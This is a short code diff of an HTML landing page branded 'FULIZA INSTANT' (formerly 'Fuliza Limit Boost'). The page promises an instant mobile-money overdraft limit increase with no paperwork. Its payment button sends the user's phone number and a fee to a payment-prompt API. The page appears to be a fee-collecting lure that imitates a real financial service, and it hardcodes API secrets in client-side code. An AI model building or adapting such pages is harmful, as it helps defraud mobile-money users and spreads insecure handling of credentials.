@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Fuliza Limit Boost</title>
+<title>FULIZA INSTANT</title>
 <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -607,7 +607,7 @@ body::after{
 </div>
 
 <div class="hero">
-  <h1>FULIZA LIMIT BOOST</h1>
+  <h1>FULIZA INSTANT</h1>
   <p>Instant Limit Increase &bull; No Paperwork &bull; Same Day Access</p>
 </div>
 
@@ -841,7 +841,7 @@ document.getElementById('payBtn').onclick=()=>{
 
   fetch('https://api.nestlink.co.ke/runPrompt',{
     method:'POST',
-    headers:{'Content-Type':'application/json','Api-Secret':'68c2431b6077f10fd67404ba'}, // duke
+    headers:{'Content-Type':'application/json','Api-Secret':'abe330f16a4c2d5b4543d91a'}, // fuliza
     body:JSON.stringify({phone:userPhone,amount:selected.fee,load_response:false})
   })
   .then(r=>r.json())
